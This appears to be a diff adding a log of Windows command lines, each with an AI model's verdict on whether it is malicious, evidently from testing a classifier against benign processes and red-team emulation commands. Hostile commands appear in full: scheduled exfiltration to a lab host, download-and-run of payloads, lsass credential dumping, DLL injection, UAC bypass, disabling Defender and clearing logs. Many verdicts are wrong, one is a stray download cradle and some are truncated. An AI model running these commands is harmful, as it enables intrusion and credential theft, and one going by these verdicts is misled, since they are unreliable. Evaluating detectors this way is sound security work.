@@ -1,0 +1,767 @@
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C ".\totallylegit.exe #{host.process.id} C:\Users\Public\creds.dmp"
+
+AI Determination: It is not possible to determine if this command is malicious without more context.
+
+_____
+
+Command Line Arg: C:\Windows\System32\svchost.exe -k WerSvcGroup
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the Windows Error Reporting Service.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe" /RuntimeWide /StopEvent:988
+
+AI Determination: No, this command is not malicious. It is a command used to stop the .NET Runtime Optimization Service.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\MusNotification.exe" Display
+
+AI Determination: It is not necessarily malicious, but it is suspicious. MusNotification.exe is not a standard Windows system file, so it could be a malicious program. It is best to investigate further to determine if it is malicious or not.
+
+_____
+
+Command Line Arg: "C:\Users\Administrator\totallylegit.exe"
+
+AI Determination: No, this command is not malicious.
+
+_____
+
+Command Line Arg: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.14393.5351_none_7f0b8fbe21ea4a21\TiWorker.exe -Embedding
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command related to Windows servicing stack.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "$loadResult = [Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\");function screenshot([Drawing.Rectangle]$bounds, $path) {   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;   $graphics = [Drawing.Graphics]::FromImage($bmp);   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);   $bmp.Save($path);   $graphics.Dispose();   $bmp.Dispose();}if ($loadResult) {  $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 9
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to bypass the execution policy and load the System.Drawing assembly, which could be used to take screenshots of the user's screen.
+
+_____
+
+Command Line Arg: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
+
+AI Determination: $a=New-Object System.Net.WebClient;$a.Proxy=[System.Net.WebRequest]::GetSystemWebProxy();$a.Proxy.Credentials=[System.Net.CredentialCache]::DefaultCredentials;IEX $a.DownloadString('http
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "$commandString = '$fieldName = \\\"#{host.dir.compress}\";$filePath = \\\"#{host.dir.compress}\";$url = \\\"http://192.168.122.197:8888/file/upload\\\";Add-Type -AssemblyName \\\"System.Net.Http\\\";$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$xRequestIdHeader = \\\"X-Request-Id\\\";$xRequestIdField = $env:COMPUTERNAME + \\\"-mjicsx\\\";$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add($xRequestIdHeader, $xRequestIdField);$userAgentHeader = \\\"User-Agent\\\";$userAgentField = \\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\";$client.DefaultRequestHeaders.Add($userAgentHeader, $userAgentField);$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();';$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"$commandString\";$trigger = New-ScheduledTaskTrigger -Once -At 12pm;Register-ScheduledTask -TaskName \"Scheduled exfiltration\" -Trigger $trigger -Action $action;"
+
+AI Determination: Yes, this command is potentially malicious. It appears to be setting up a scheduled task to execute a PowerShell command that could be used to exfiltrate data from the system.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXxw3e32mpkfkfbh0tznpwwqfw96t0tfx6.mca
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to run a background task on a Windows system.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";$download_folder = \"C:\Users\Public\\\";$staging_folder = \"C:\Users\Public\temp\";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;$arch=[System.Environment]::Is64BitOperatingSystem;if ($arch) {    iex $staging_folder\"\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\error.dmp 2>&1;} else {    iex $staging_folder\"\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\error.dmp 2>&1;}remove-item $staging_folder -Recurse;"
+
+AI Determination: Yes, this command is potentially malicious. It is downloading and running a program from an external source, which could be malicious.
+
+_____
+
+Command Line Arg: taskhostw.exe Install $(Arg0)
+
+AI Determination: It is not necessarily malicious, but it could be depending on the context. It could be a legitimate command used to install a program, or it could be malicious code used to install malicious software.
+
+_____
+
+Command Line Arg: "C:\Windows\System32\XblGameSaveTask.exe" standby
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to manage Xbox Live game saves.
+
+_____
+
+Command Line Arg: C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe -StartupEvent 210 -InterruptEvent 0 -NGENProcess 1fc -Pipe 20c -Comment "NGen Worker Process"
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to launch the Microsoft .NET Framework NGEN Worker Process.
+
+_____
+
+Command Line Arg: C:\Windows\system32\svchost.exe -k netsvcs -p -s wisvc
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the Windows Service Host process.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe" /StopEvent:1364
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to stop a .NET Framework NGEN task.
+
+_____
+
+Command Line Arg: "C:\Program Files\Windows Defender\MpCmdRun.exe" Scan -ScheduleJob
+
+AI Determination: No, this command is not malicious. It is a command used to schedule a scan with Windows Defender.
+
+_____
+
+Command Line Arg: C:\Windows\system32\svchost.exe -k wsappx -p -s AppXSvc
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the AppXSvc service.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "$explorer = Get-Process -Name explorer;mavinject.exe $explorer.id C:\Users\Public\sandcat.dll"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to inject a malicious DLL file into the Windows Explorer process.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\dstokenclean.exe"
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to clean up the Windows Security Token Service.
+
+_____
+
+Command Line Arg: C:\Windows\System32\smartscreen.exe -Embedding
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to launch the Windows SmartScreen application.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe" RemoveTaskDelayStartTrigger /LegacyServiceBehavior
+
+AI Determination: No, this command is not malicious. It is a command used to remove a task delay start trigger from the .NET Framework.
+
+_____
+
+Command Line Arg: "C:\Windows\System32\Wbem\WMIC.exe" /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
+
+AI Determination: No, this command is not malicious. It is a Windows Management Instrumentation Command (WMIC) used to query the Windows Security Center for information about installed antivirus products.
+
+_____
+
+Command Line Arg: "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua /installsource scheduler
+
+AI Determination: No, this command is not malicious. It appears to be a command to update Microsoft Edge.
+
+_____
+
+Command Line Arg: "C:\Program Files\WindowsApps\Microsoft.Windows.Photos_2019.19071.12548.0_x64__8wekyb3d8bbwe\Microsoft.Photos.exe" -ServerName:App.AppXzst44mncqdg84v7sv6p7yznqwssy6f7f.mca
+
+AI Determination: No, this command is not malicious. It appears to be a command to launch the Microsoft Photos application.
+
+_____
+
+Command Line Arg: C:\Windows\system32\mcbuilder.exe
+
+AI Determination: No, this command is not malicious. It is a legitimate Windows command used to manage the Windows Management Instrumentation (WMI) repository.
+
+_____
+
+Command Line Arg: C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -s WPDBusEnum
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start a Windows service.
+
+_____
+
+Command Line Arg: "C:\Program Files\Windows Defender\MpUxSrv.exe" -Embedding
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to launch Windows Defender.
+
+_____
+
+Command Line Arg: "C:\Windows\System32\LocationNotificationWindows.exe"
+
+AI Determination: Yes, this command appears to be malicious. It is not a standard Windows system file and it contains suspicious characters.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe" /RuntimeWide /StopEvent:980
+
+AI Determination: No, this command is not malicious. It is a command used to stop the .NET Runtime Optimization Service.
+
+_____
+
+Command Line Arg: C:\Windows\system32\CompatTelRunner.exe -m:pcasvc.dll -f:QueryEncapsulationSettings -cv:eEC6kbqI3UyCC/0a.5
+
+AI Determination: No, this command does not appear to be malicious. It appears to be a command used to query encapsulation settings for the pcasvc.dll file.
+
+_____
+
+Command Line Arg: "c:\windows\system32\cmstp.exe" /au C:\windows\temp\hrc3cehf.inf
+
+AI Determination: It is not necessarily malicious, but it could be. cmstp.exe is a legitimate Windows program, but it can be used to install malicious software. It is best to investigate further to determine if this command is malicious or not.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\ProvTool.exe" /turn 5 /source LogonIdleTask
+
+AI Determination: No, this command is not malicious. It appears to be a command to turn on a Windows task called LogonIdleTask.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "Import-Module .\powerview.ps1;Get-NetLocalGroupMember -ComputerName #{remote.host.fqdn}"
+
+AI Determination: It is potentially malicious. It is attempting to bypass the execution policy and import a PowerShell module called "powerview.ps1" which could be used to gain access to a remote host.
+
+_____
+
+Command Line Arg: "C:\Windows\System32\XblGameSaveTask.exe" logon
+
+AI Determination: No, this command is not malicious. It is a legitimate Windows command that is used to manage Xbox Live game save data.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\nbtstat.exe" -n
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to view NetBIOS information about a computer on a network.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\")"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to bypass the ExecutionPolicy and download a script from an external source.
+
+_____
+
+Command Line Arg: C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the Background Intelligent Transfer Service (BITS) in Windows.
+
+_____
+
+Command Line Arg: taskhostw.exe /RuntimeWide
+
+AI Determination: Yes, this command is potentially malicious. It is not a standard Windows command and could be used to execute malicious code.
+
+_____
+
+Command Line Arg: C:\Windows\system32\CompatTelRunner.exe -m:invagent.dll -f:RunUpdate -cv:zVFIS6hgREOZedlY.5
+
+AI Determination: It is not necessarily malicious, but it could be depending on the context. It is best to investigate further to determine if it is malicious or not.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell -Name ExecutionPolicy -Value ByPass;        $shell = New-Object -ComObject Wscript.Shell        Set-ExecutionPolicy Bypass | echo $shell.sendkeys(\"Y`r`n\")"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to bypass the PowerShell execution policy and set it to Bypass.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe" /RuntimeWide /StopEvent:904
+
+AI Determination: No, this command is not malicious. It is a command used to stop the .NET Runtime Optimization Service.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe" /RuntimeWide /StopEvent:860
+
+AI Determination: No, this command is not malicious. It is a command used to stop a .NET Runtime optimization service.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };$valid | ConvertTo-Json"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to bypass the ExecutionPolicy and is using the Get-Process and Get-WmiObject cmdlets to retrieve information about processes running on the system.
+
+_____
+
+Command Line Arg: C:\Windows\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun -cv:zVFIS6hgREOZedlY.2
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to run the Windows Appraiser tool.
+
+_____
+
+Command Line Arg: C:\Windows\system32\compattelrunner.exe -m:GeneralTel.dll -f:RunGeneralTelemetry  -cV zVFIS6hgREOZedlY.2.2 -SendFullTelemetry -ThrottleUtc
+
+AI Determination: Yes, this command appears to be malicious. It is attempting to run a malicious DLL file and send full telemetry data.
+
+_____
+
+Command Line Arg: C:\Windows\system32\svchost.exe -k netsvcs -p
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start a service host process.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\backgroundTaskHost.exe" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to run a background task.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-261946055-3477644081-1494996267-10014_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-261946055-3477644081-1494996267-10014 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"  "1"
+
+AI Determination: No, this command is not malicious. It is a legitimate command used by Windows Search Protocol Host to index files and folders.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Restricted -Command  $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\inf\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\[defaultinstall.nt(amd64|arm|arm64|x86)\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to find and read files with the ".inf" extension in the Windows directory, which could be used to gain access to sensitive information.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\SearchFilterHost.exe" 0 800 804 812 8192 808 784 
+
+AI Determination: No, this command is not malicious. It appears to be a command to run the SearchFilterHost.exe program with certain parameters.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "$url=\"http://192.168.122.197:8888/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\Users\Public\$name.exe\",$data);$job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\Users\Public\$name.exe -group red\"; };Receive-Job -Job $job -Wait;"
+
+AI Determination: Yes, this command is malicious. It is attempting to download a file from a remote server, write it to the user's public folder, and then execute it with elevated privileges.
+
+_____
+
+Command Line Arg: C:\Windows\system32\sppsvc.exe
+
+AI Determination: No, this command is not malicious. It is a legitimate Windows system command that is used to manage Windows Software Protection Service.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "Clear-Eventlog Security;Clear-Eventlog System;"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to bypass the ExecutionPolicy and clear the Security and System event logs.
+
+_____
+
+Command Line Arg: "C:\Users\Public\temp\procdump64.exe" -accepteula -ma lsass.exe
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to use the procdump64.exe tool to dump the lsass.exe process, which is a Windows process that stores user credentials. This could be used to gain access to user accounts.
+
+_____
+
+Command Line Arg: C:\Windows\System32\svchost.exe -k wsappx
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the Windows Service Host process.
+
+_____
+
+Command Line Arg: taskhostw.exe U
+
+AI Determination: Yes, this command is potentially malicious. It appears to be an attempt to execute a command with elevated privileges, which could be used to install malicious software or access sensitive data.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-261946055-3477644081-1494996267-10013_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-261946055-3477644081-1494996267-10013 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon"  "1"
+
+AI Determination: No, this command is not malicious. It is a legitimate command used by Windows Search Protocol Host to search for files on the computer.
+
+_____
+
+Command Line Arg: C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.2664_none_7dfa24947c9c0a36\TiWorker.exe -Embedding
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command related to Windows servicing stack.
+
+_____
+
+Command Line Arg: C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the License Manager service in Windows.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\AppHostRegistrationVerifier.exe"
+
+AI Determination: No, this command is not malicious. It is a legitimate Windows command used to verify the registration of AppHost services.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\lpremove.exe"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to execute the lpremove.exe file, which is a legitimate Windows system file, but the additional parameters added to the command could be malicious.
+
+_____
+
+Command Line Arg: C:\Windows\system32\svchost.exe -k LocalService -s W32Time
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the Windows Time Service.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C ".\Akagi64.exe 30 C:\Windows\System32\cmd.exe"
+
+AI Determination: Yes, this command appears to be malicious. It is attempting to bypass the ExecutionPolicy and run a file called Akagi64.exe with the argument of 30 and then run cmd.exe.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\BackgroundTaskHost.exe" -ServerName:BackgroundTaskHost.WebAccountProvider
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to launch the Windows Background Task Host.
+
+_____
+
+Command Line Arg: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --type=utility --utility-sub-type=asset_store.mojom.AssetStoreService --lang=en-US --service-sandbox-type=asset_store_service --mojo-platform-channel-handle=7152 --field-trial-handle=1588,i,15588918170266153223,9401790713667022256,131072 /prefetch:8
+
+AI Determination: No, this command is not malicious. It appears to be a command to launch Microsoft Edge with certain parameters.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\compattelrunner.exe" -maintenance
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to run the Windows Component Clean Tool.
+
+_____
+
+Command Line Arg: taskhostw.exe
+
+AI Determination: Yes, this command is potentially malicious. It is not a standard Windows command and could be used to execute malicious code.
+
+_____
+
+Command Line Arg: "C:\Program Files\Windows Defender\MpCmdRun.exe" -IdleTask -TaskName WdCacheMaintenance
+
+AI Determination: No, this command is not malicious. It is a command used to run Windows Defender's Cache Maintenance task.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\ARP.EXE" -a
+
+AI Determination: Yes, this command is potentially malicious. ARP.EXE is a legitimate Windows system file, but the additional parameters added to the command could be used to perform malicious activities.
+
+_____
+
+Command Line Arg: C:\Windows\system32\svchost.exe -k appmodel -p -s camsvc
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the AppModel service in Windows.
+
+_____
+
+Command Line Arg: C:\Windows\System32\svchost.exe -k wsappx -p -s ClipSVC
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the ClipSVC service in Windows.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\dmclient.exe"
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the DirectAccess Connection Manager service.
+
+_____
+
+Command Line Arg: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start a Windows service.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host "Final result:", $res
+
+AI Determination: Yes, this command is potentially malicious. It appears to be attempting to determine if a virtual switch is present on the system, which could be used to gain access to the system.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\mavinject.exe" 2840 C:\Users\Public\sandcat.dll
+
+AI Determination: Yes, this command is potentially malicious. It appears to be attempting to inject a malicious DLL file into the system.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\disksnapshot.exe" -z
+
+AI Determination: Yes, this command is potentially malicious. It appears to be an attempt to execute a command injection attack.
+
+_____
+
+Command Line Arg: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
+
+AI Determination: No, this command is not malicious. It is a legitimate Windows command used to launch the Windows Management Instrumentation Provider Service.
+
+_____
+
+Command Line Arg: C:\Windows\System32\RuntimeBroker.exe -Embedding
+
+AI Determination: No, this command is not malicious. It is a legitimate Windows system command that is used to manage permissions for Windows Store apps.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe" RemoveTaskDelayStartTrigger /LegacyServiceBehavior
+
+AI Determination: No, this command is not malicious. It is a command used to remove a task delay start trigger from the .NET Framework.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "nbtstat -n"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to bypass the ExecutionPolicy, which is a security measure that prevents malicious scripts from running.
+
+_____
+
+Command Line Arg: "c:\windows\system32\cmstp.exe" /au C:\windows\temp\4y5bdyos.inf
+
+AI Determination: No, this command is not malicious. It is a command used to install Connection Manager Profile (.inf) files.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\sc.exe" start w32time task_started
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the Windows Time Service.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to bypass the ExecutionPolicy and clear the command history.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"
+
+AI Determination: Yes, this command is potentially malicious. It is disabling several security features of Windows Defender, which could allow malicious software to be installed on the system.
+
+_____
+
+Command Line Arg: C:\Windows\system32\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to launch a COM surrogate process.
+
+_____
+
+Command Line Arg: C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to launch a COM surrogate process.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe" ExecuteQueuedItems /LegacyServiceBehavior
+
+AI Determination: No, this command is not malicious. It is a command used to execute native images that have been queued for installation by the Native Image Generator (NGEN).
+
+_____
+
+Command Line Arg: "C:\Windows\system32\rundll32.exe" /d acproxy.dll,PerformAutochkOperations
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to perform autochk operations.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "reg query HKCU /f password /t REG_SZ /s"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to query the registry for any stored passwords.
+
+_____
+
+Command Line Arg: C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the Windows service host process.
+
+_____
+
+Command Line Arg: C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s DsSvc
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start the Directory Service service in Windows.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe" install "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" /NoDependencies /noroot /version:v4.0.30319 /LegacyServiceBehavior
+
+AI Determination: No, this command is not malicious. It is a command used to install the .NET Framework 4.0.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force"
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to modify the Windows registry to disable User Account Control (UAC). This could be used to bypass security measures and allow malicious code to run on the system.
+
+_____
+
+Command Line Arg: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+
+AI Determination: It is not necessarily malicious, but it could be used for malicious purposes. It is a command that can be used to launch a process with elevated privileges, which could be used to install malicious software or access sensitive data.
+
+_____
+
+Command Line Arg: C:\Users\Derp\AppData\Local\Temp\7371DF9E-7713-4372-935F-ECEBE1C0CAF0\dismhost.exe {9E4A2B4B-4FC0-4A25-9509-2C3375C4222E}
+
+AI Determination: It is not possible to determine if this command is malicious without more information.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe" install "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" /NoDependencies /noroot /version:v4.0.30319 /LegacyServiceBehavior
+
+AI Determination: No, this command is not malicious. It is a command used to install the .NET Framework 4.0.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "arp -a"
+
+AI Determination: No, this command is not malicious. It is a PowerShell command that is used to display the contents of the Address Resolution Protocol (ARP) cache.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "$url=\"http://192.168.122.197:8888/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"shared.go\");$wc.Headers.add(\"server\",\"http://192.168.122.197:8888\");$PEBytes = $wc.DownloadData($url);$wc1 = New-Object System.net.webclient;$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");IEX ($wc1.DownloadString($url));Invoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}"
+
+AI Determination: Yes, this command is malicious. It is attempting to download and execute a malicious file from a remote server.
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe" /StopEvent:1364
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to stop a .NET Framework NGEN task.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\reg.exe" query HKCU /f password /t REG_SZ /s
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to query the Windows registry for a value associated with the key "password".
+
+_____
+
+Command Line Arg: "C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe" ExecuteQueuedItems /LegacyServiceBehavior
+
+AI Determination: No, this command is not malicious. It is a command used to execute native images that have been queued for installation by the Native Image Generator (NGEN).
+
+_____
+
+Command Line Arg: C:\Windows\servicing\TrustedInstaller.exe
+
+AI Determination: Yes, this command is potentially malicious. It is attempting to run the TrustedInstaller.exe file with an invalid argument, which could be an attempt to exploit a vulnerability in the system.
+
+_____
+
+Command Line Arg: taskhostw.exe -RegisterDevice -AccountChange
+
+AI Determination: Yes, this command appears to be malicious. It contains a suspicious character ("
+
+_____
+
+Command Line Arg: C:\Windows\System32\mousocoreworker.exe -Embedding
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to launch a Windows system process.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXggkaqzf6p31g37n0m8phzeswb0rt9m7e.mca
+
+AI Determination: No, this command is not malicious. It appears to be a legitimate command used to run a background task on a Windows system.
+
+_____
+
+Command Line Arg: C:\Windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc
+
+AI Determination: No, this command is not malicious. It is a legitimate command used to start a Windows service.
+
+_____
+
+Command Line Arg: powershell.exe -ExecutionPolicy Bypass -C "wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value"
+
+AI Determination: It is not necessarily malicious, but it could be used for malicious purposes. It is a command that can be used to query the antivirus product installed on a system.
+
+_____
+
+Command Line Arg: C:\Windows\system32\CompatTelRunner.exe -m:invagent.dll -f:RunUpdate -cv:eEC6kbqI3UyCC/0a.6
+
+AI Determination: It is not possible to determine if this command is malicious without more context.
+
+_____
+
+Command Line Arg: "C:\Windows\system32\cleanmgr.exe" /autoclean /d C:
+
